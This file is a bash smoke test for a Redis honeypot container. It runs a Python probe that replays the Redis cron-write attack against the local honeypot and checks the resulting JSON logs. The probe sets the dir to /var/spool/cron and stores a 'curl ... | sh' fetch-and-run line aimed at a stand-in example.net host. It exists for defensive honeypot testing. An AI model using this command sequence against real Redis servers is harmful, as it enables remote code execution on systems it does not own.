#!/usr/bin/env bash

set -Eeuo pipefail

unset CDPATH
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=../lib/common.sh
source "${SCRIPT_DIR}/../lib/common.sh"

TEST_NAME="redishoneypot"
DEFAULT_IMAGE="dtagdevsec/redishoneypot:24.04.2"
IMAGE=""
PROFILE="redis74"
REDIS_PORT=""
LOG_DIR=""
LOG_FILE=""
MAPPED_REDIS_PORT=""
PROBE_RESULT=""

usage() {
  cat <<EOF
Usage: $0 [options]

Run an isolated post-build smoke test for the RedisHoneyPot image.

Options:
  --image IMAGE       Image to test. Defaults to docker/redishoneypot/docker-compose.yml.
  --profile NAME      Persona (REDISHONEYPOT_PROFILE): redis74, legacy6, current8,
                      redis50, valkey8. Default: redis74.
  --redis-port PORT   Host TCP port for Redis. Default: dynamic loopback port.
  --timeout SEC       Timeout for startup, protocol, and log checks. Default: 30.
  --bind-ip IP        Host IP to bind. Default: 127.0.0.1.
  --keep-artifacts    Keep temporary compose file and logs for debugging.
  -h, --help          Show this help message.
EOF
}

parse_args() {
  while [[ $# -gt 0 ]]; do
    case "$1" in
      --image)
        [[ $# -ge 2 ]] || test_die "--image requires an argument"
        IMAGE="$2"
        shift 2
        ;;
      --image=*)
        IMAGE="${1#*=}"
        shift
        ;;
      --profile)
        [[ $# -ge 2 ]] || test_die "--profile requires an argument"
        PROFILE="$2"
        shift 2
        ;;
      --profile=*)
        PROFILE="${1#*=}"
        shift
        ;;
      --redis-port|--host-port|--port)
        [[ $# -ge 2 ]] || test_die "$1 requires an argument"
        REDIS_PORT="$2"
        shift 2
        ;;
      --redis-port=*|--host-port=*|--port=*)
        REDIS_PORT="${1#*=}"
        shift
        ;;
      --timeout)
        [[ $# -ge 2 ]] || test_die "--timeout requires an argument"
        TEST_TIMEOUT="$2"
        shift 2
        ;;
      --timeout=*)
        TEST_TIMEOUT="${1#*=}"
        shift
        ;;
      --bind-ip)
        [[ $# -ge 2 ]] || test_die "--bind-ip requires an argument"
        TEST_BIND_IP="$2"
        shift 2
        ;;
      --bind-ip=*)
        TEST_BIND_IP="${1#*=}"
        shift
        ;;
      --keep-artifacts)
        TEST_KEEP_ARTIFACTS="true"
        shift
        ;;
      -h|--help)
        usage
        exit 0
        ;;
      *)
        test_die "Unknown option: $1"
        ;;
    esac
  done
}

validate_args() {
  test_validate_timeout

  case "${PROFILE}" in
    redis74|legacy6|current8|redis50|valkey8) ;;
    *) test_die "Unknown --profile: ${PROFILE}" ;;
  esac

  if [[ -n "${REDIS_PORT}" ]]; then
    test_validate_port "${REDIS_PORT}"
  fi
}

prepare_redishoneypot_harness() {
  test_prepare_harness "${TEST_NAME}"

  LOG_DIR="${TEST_TMP_ROOT}/log"
  LOG_FILE="${LOG_DIR}/redishoneypot.log"
  PROBE_RESULT="${TEST_TMP_ROOT}/probe.json"
  TEST_ARTIFACT_LOG_DIR="${LOG_DIR}"

  mkdir -p "${LOG_DIR}"
  chmod 0777 "${LOG_DIR}"

  local port_mapping="${TEST_BIND_IP}::6379"
  if [[ -n "${REDIS_PORT}" ]]; then
    port_mapping="${TEST_BIND_IP}:${REDIS_PORT}:6379"
  fi

  # the image's own healthcheck runs, only more often than in T-Pot
  cat > "${TEST_HARNESS_COMPOSE}" <<EOF
services:
  redishoneypot:
    image: "${IMAGE}"
    container_name: "${TEST_CONTAINER_NAME}"
    restart: "no"
    read_only: true
    user: "2000:2000"
    environment:
      REDISHONEYPOT_PROFILE: "${PROFILE}"
    healthcheck:
      interval: 2s
      start_period: 5s
    ports:
      - "${port_mapping}"
    volumes:
      - "${LOG_DIR}:/var/log/redishoneypot"
networks:
  default:
    name: "${TEST_PROJECT_NAME}_net"
EOF
}

run_redis_probe() {
  local token="$1"

  python3 - "${TEST_BIND_IP}" "${MAPPED_REDIS_PORT}" "${token}" "${TEST_TIMEOUT}" "${PROFILE}" "${PROBE_RESULT}" <<'PY'
import json
import socket
import sys

host = sys.argv[1]
port = int(sys.argv[2])
token = sys.argv[3]
timeout = int(sys.argv[4])
profile = sys.argv[5]
result_file = sys.argv[6]
key = "redishoneypot-smoke-key-{}".format(token)
cron_url = "http://{}.example.net/init.sh".format(token)
versions = {
    "redis74": "redis_version:7.4.5",
    "legacy6": "redis_version:6.2.18",
    "current8": "redis_version:8.8.0",
    "redis50": "redis_version:5.0.7",
    "valkey8": "valkey_version:8.1.3",
}


def fail(message):
    print(message, file=sys.stderr)
    sys.exit(1)


def encode_command(*parts):
    encoded = ["*{}\r\n".format(len(parts)).encode("ascii")]
    for part in parts:
        raw = str(part).encode("utf-8")
        encoded.append(b"$" + str(len(raw)).encode("ascii") + b"\r\n")
        encoded.append(raw + b"\r\n")
    return b"".join(encoded)


def read_line(reader):
    line = reader.readline()
    if not line:
        raise RuntimeError("connection closed while reading response")
    return line


def read_response(reader):
    line = read_line(reader)
    prefix = line[:1]
    payload = line[1:-2].decode("utf-8", errors="replace")

    if prefix in (b"+", b"-", b":"):
        return prefix.decode("ascii"), payload

    if prefix == b"$":
        length = int(payload)
        if length < 0:
            return "$", None
        body = reader.read(length)
        trailer = reader.read(2)
        if len(body) != length or trailer != b"\r\n":
            raise RuntimeError("invalid bulk response framing")
        return "$", body.decode("utf-8", errors="replace")

    raise RuntimeError("unexpected Redis response line: {!r}".format(line))


def request(sock, reader, *parts):
    sock.sendall(encode_command(*parts))
    return read_response(reader)


def expect(reply, wanted, what):
    if reply != wanted:
        fail("Unexpected {} response: {!r}".format(what, reply))


connect_timeout = max(1.0, min(float(timeout), 5.0))

try:
    with socket.create_connection((host, port), timeout=connect_timeout) as sock:
        sock.settimeout(connect_timeout)
        reader = sock.makefile("rb")

        expect(request(sock, reader, "PING"), ("+", "PONG"), "PING")

        kind, payload = request(sock, reader, "INFO")
        if kind != "$" or versions[profile] not in (payload or ""):
            fail("Unexpected INFO response for {}: kind={!r} payload={!r}".format(profile, kind, payload[:160] if payload else payload))

        expect(request(sock, reader, "SET", key, token), ("+", "OK"), "SET")
        expect(request(sock, reader, "GET", key), ("$", token), "GET")

        # file write playbook, personas with protected configs refuse dir like the real server
        kind, payload = request(sock, reader, "CONFIG", "SET", "dir", "/var/spool/cron")
        write_ok = (kind, payload) == ("+", "OK")
        if not write_ok and kind != "-":
            fail("Unexpected CONFIG SET dir response: {!r}".format((kind, payload)))
        if write_ok:
            expect(request(sock, reader, "CONFIG", "SET", "dbfilename", "root"), ("+", "OK"), "CONFIG SET dbfilename")
        expect(request(sock, reader, "SET", "backup1", "\n\n*/2 * * * * curl -fsSL {} | sh\n\n".format(cron_url)), ("+", "OK"), "SET cron")
        expect(request(sock, reader, "SAVE"), ("+", "OK"), "SAVE")
        expect(request(sock, reader, "EVAL", "return 1", "0"), (":", "1"), "EVAL")
        expect(request(sock, reader, "QUIT"), ("+", "OK"), "QUIT")
        reader.close()
except (OSError, RuntimeError, ValueError) as exc:
    fail("RedisHoneyPot Redis probe failed: {}".format(exc))

with open(result_file, "w", encoding="utf-8") as handle:
    json.dump({"write_ok": write_ok, "cron_url": cron_url}, handle)
print("RedisHoneyPot Redis probe succeeded for token {} (CONFIG SET dir {})".format(token, "accepted" if write_ok else "refused"))
PY
}

run_redis_probe_with_retries() {
  local token="$1"
  local deadline=$((SECONDS + TEST_TIMEOUT))
  local output=""

  while (( SECONDS < deadline )); do
    if output="$(run_redis_probe "${token}" 2>&1)"; then
      printf '%s\n' "${output}"
      return 0
    fi
    sleep 1
  done

  printf '%s\n' "${output}" >&2
  return 1
}

wait_for_healthy() {
  local deadline=$((SECONDS + TEST_TIMEOUT))
  local health=""

  while (( SECONDS < deadline )); do
    health="$(docker inspect -f '{{if .State.Health}}{{.State.Health.Status}}{{end}}' "${TEST_CONTAINER_NAME}" 2>/dev/null || true)"
    case "${health}" in
      healthy)
        return 0
        ;;
      unhealthy|"")
        printf 'Container health: %s\n' "${health:-none}" >&2
        return 1
        ;;
    esac
    sleep 1
  done

  printf 'Container health: %s\n' "${health}" >&2
  return 1
}

wait_for_log_events() {
  local token="$1"

  python3 - "${LOG_FILE}" "${token}" "${TEST_TIMEOUT}" "${PROFILE}" "${PROBE_RESULT}" <<'PY'
import hashlib
import json
import sys
import time
from pathlib import Path

log_file = Path(sys.argv[1])
token = sys.argv[2]
timeout = int(sys.argv[3])
profile = sys.argv[4]
probe = json.loads(Path(sys.argv[5]).read_text(encoding="utf-8"))
deadline = time.monotonic() + timeout
key = "redishoneypot-smoke-key-{}".format(token)
script_sha1 = hashlib.sha1(b"return 1").hexdigest()
lifecycle = {"start", "shutdown_requested", "startup_failed", "server_failed", "deprecated_flag_ignored"}
last_error = None


def load_events():
    if not log_file.exists():
        raise RuntimeError("{} does not exist yet".format(log_file))

    events = []
    for line_number, line in enumerate(log_file.read_text(encoding="utf-8", errors="replace").splitlines(), 1):
        stripped = line.strip()
        if not stripped:
            continue
        try:
            event = json.loads(stripped)
        except json.JSONDecodeError as exc:
            raise RuntimeError("Invalid JSON in {}:{}: {}".format(log_file, line_number, exc)) from exc
        if not isinstance(event, dict):
            raise RuntimeError("JSON event in {}:{} is not an object".format(log_file, line_number))
        if any(value is None or isinstance(value, (dict, list)) for value in event.values()):
            raise RuntimeError("JSON event in {}:{} has a null or nested value: {!r}".format(log_file, line_number, event))
        if event.get("event") in lifecycle:
            raise RuntimeError("Lifecycle event in {}:{}: {!r}".format(log_file, line_number, event))
        if event.get("client_name") == "__redishoneypot_healthcheck__":
            raise RuntimeError("Healthcheck session logged in {}:{}".format(log_file, line_number))
        for field in ("timestamp", "event", "session_id", "src_ip", "src_port", "dest_port"):
            if field not in event:
                raise RuntimeError("JSON event in {}:{} lacks {}: {!r}".format(log_file, line_number, field, event))
        if event.get("profile") != profile:
            raise RuntimeError("JSON event in {}:{} has profile {!r}, expected {}".format(log_file, line_number, event.get("profile"), profile))
        events.append(event)

    return events


def find(events, **fields):
    return next((e for e in events if all(e.get(k) == v for k, v in fields.items())), None)


def check(events):
    set_event = find(events, event="command", command="SET", key=key)
    if not set_event:
        return ["SET token"]
    ours = [e for e in events if e.get("session_id") == set_event["session_id"]]

    missing = []
    if set_event.get("value_text") != token:
        missing.append("SET value_text")
    if not find(ours, event="connect"):
        missing.append("connect")
    for command in ("PING", "INFO", "SAVE", "QUIT"):
        if not find(ours, event="command", command=command):
            missing.append(command)
    if not find(ours, event="command", command="GET", key=key):
        missing.append("GET key")
    if not find(ours, event="command", command="CONFIG", config_key="dir", config_value="/var/spool/cron"):
        missing.append("CONFIG SET dir")
    cron = find(ours, event="command", command="SET", key="backup1")
    if not cron or cron.get("analysis_hint") != "cron_payload" or probe["cron_url"] not in cron.get("ioc_urls", "").split(" "):
        missing.append("SET cron with cron_payload and ioc_urls")
    save = find(ours, event="command", command="SAVE")
    if probe["write_ok"] and (not save or save.get("analysis_hint") != "redis_write_file_commit" or save.get("target_dir") != "/var/spool/cron"):
        missing.append("SAVE redis_write_file_commit with target_dir")
    if not find(ours, event="command", command="EVAL", script_sha1=script_sha1):
        missing.append("EVAL script_sha1")
    close = find(ours, event="close")
    if not close or "session_end" not in close or close.get("session_command_count", 0) < 9:
        missing.append("close with session_end and session_command_count")
    return missing


while time.monotonic() < deadline:
    try:
        missing = check(load_events())
        if not missing:
            print("RedisHoneyPot log events found in {}".format(log_file))
            sys.exit(0)
        last_error = "Missing RedisHoneyPot log events: {}".format(", ".join(missing))
    except RuntimeError as exc:
        last_error = str(exc)
    time.sleep(1)

if last_error:
    print(last_error, file=sys.stderr)
print("No complete RedisHoneyPot log event set found in {} for token {}".format(log_file, token), file=sys.stderr)
sys.exit(1)
PY
}

assert_stdout_lifecycle_only() {
  local output=""

  output="$(test_compose logs --no-color --no-log-prefix 2>/dev/null || true)"
  if ! grep -F '"event":"start"' <<< "${output}" | grep -F "\"profile\":\"${PROFILE}\"" | grep -q -F '"log_stdout":false'; then
    test_die "RedisHoneyPot start event with profile ${PROFILE} and log_stdout false missing in Docker logs"
  fi
  if grep -q -E '"event":"(connect|command|close|protocol_error)"' <<< "${output}"; then
    test_die "RedisHoneyPot honeypot events found in Docker logs, they belong in redishoneypot.log only"
  fi
}

assert_no_runtime_errors() {
  local pattern="panic:|fatal error|Permission denied|Read-only file system|Address already in use|log_file_setup_failed|log_file_open_failed|startup_failed|server_failed|unknown profile"

  if grep -R -I -E "${pattern}" "${LOG_DIR}" >/dev/null 2>&1; then
    test_die "RedisHoneyPot runtime error found in log artifacts"
  fi

  if test_compose logs --no-color 2>/dev/null | grep -E "${pattern}" >/dev/null 2>&1; then
    test_die "RedisHoneyPot runtime error found in Docker logs"
  fi
}

main() {
  parse_args "$@"
  validate_args
  test_check_dependencies

  if [[ -z "${IMAGE}" ]]; then
    IMAGE="$(test_read_compose_image "${TEST_NAME}" "${DEFAULT_IMAGE}")"
  fi

  test_info "Using image: ${IMAGE} (persona ${PROFILE})"
  test_require_image "${IMAGE}" "docker compose -f docker/${TEST_NAME}/docker-compose.yml build ${TEST_NAME}"

  if [[ -n "${REDIS_PORT}" ]]; then
    test_ensure_port_free "${TEST_BIND_IP}" "${REDIS_PORT}" || test_die "${TEST_BIND_IP}:${REDIS_PORT} is already in use. Try --redis-port <free-port>."
  fi

  prepare_redishoneypot_harness
  test_enable_cleanup

  test_info "Starting isolated RedisHoneyPot container"
  test_compose up -d --no-build >/dev/null

  test_wait_for_container || test_die "RedisHoneyPot container did not stay running"
  test_ok "Container is running"

  wait_for_healthy || test_die "RedisHoneyPot container did not become healthy"
  test_ok "Container is healthy"

  MAPPED_REDIS_PORT="$(test_get_mapped_port "${TEST_NAME}" "6379")" || test_die "Could not resolve mapped host port for 6379/tcp"
  test_ok "Port ${TEST_BIND_IP}:${MAPPED_REDIS_PORT} maps to container port 6379/tcp"

  local token="redishoneypot-test-$(date +%s)-$$"

  test_info "Running RedisHoneyPot Redis probe with token: ${token}"
  run_redis_probe_with_retries "${token}" || test_die "RedisHoneyPot probe failed on ${TEST_BIND_IP}:${MAPPED_REDIS_PORT}"
  test_wait_for_container || test_die "RedisHoneyPot container stopped after Redis probe"

  test_info "Waiting for RedisHoneyPot JSON log events"
  wait_for_log_events "${token}" || test_die "Expected RedisHoneyPot events were not found in redishoneypot.log"
  test_ok "RedisHoneyPot command events were written to redishoneypot.log"

  assert_stdout_lifecycle_only
  test_ok "Docker logs hold the start event only, no honeypot events"

  assert_no_runtime_errors
  test_ok "No RedisHoneyPot runtime errors found in logs"

  test_ok "RedisHoneyPot post-build smoke test completed successfully"
}

main "$@"
